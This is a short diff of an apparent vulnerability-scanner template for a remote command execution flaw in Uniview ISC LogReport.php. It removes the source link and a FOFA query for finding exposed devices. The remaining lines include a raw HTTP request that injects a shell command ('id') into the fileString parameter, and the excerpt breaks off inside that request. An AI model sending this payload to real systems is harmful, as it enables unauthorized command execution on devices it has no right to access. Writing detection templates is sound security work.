@@ -3,12 +3,8 @@ info:
   name: 浙江宇视科技ISC LogReport.php 远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gh2vqhiwzdy84u92'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gh2vqhiwzdy84u92
-    fofa: title=="ISC5000-E"
 http:
 - raw:
   - 'GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x%3bid%3e1.txt HTTP/1.1
